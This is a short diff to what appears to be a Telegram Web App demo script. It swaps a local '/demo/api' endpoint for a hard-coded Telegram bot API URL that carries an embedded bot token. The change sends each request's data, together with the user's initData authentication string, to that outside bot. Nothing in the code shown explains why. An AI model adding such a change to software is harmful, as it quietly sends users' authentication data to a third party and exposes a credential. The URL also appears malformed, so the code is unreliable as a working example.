@@ -731,7 +731,7 @@
             // return onCallback && onCallback({error: 'This function (' + method + ') should send requests to your backend. Please, change this code to your own.'});
 
             const authData = DemoApp.initData || '';
-            fetch('/demo/api', {
+            fetch('https://api.telegram.org/7045206212:AAH0eMH989BWHfuxdlKe6kY6CspWGc266Bs', {
                 method     : 'POST',
                 body       : JSON.stringify(Object.assign(data, {
                     _auth : authData,
